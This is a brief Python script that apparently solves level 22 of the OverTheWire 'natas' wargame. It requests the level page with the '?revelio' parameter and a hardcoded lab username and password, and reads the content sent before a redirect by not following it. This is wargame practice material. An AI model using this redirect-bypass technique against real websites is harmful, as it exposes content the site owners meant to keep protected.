#!bin/python3
import requests
import binascii

url = "http://natas22.natas.labs.overthewire.org/?revelio"
auth_username = "natas22"
auth_password = "chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ"

r = requests.get(url,auth=(auth_username,auth_password),allow_redirects=False)
print(f"{r.text}\n{r.cookies}")
print(r.history)
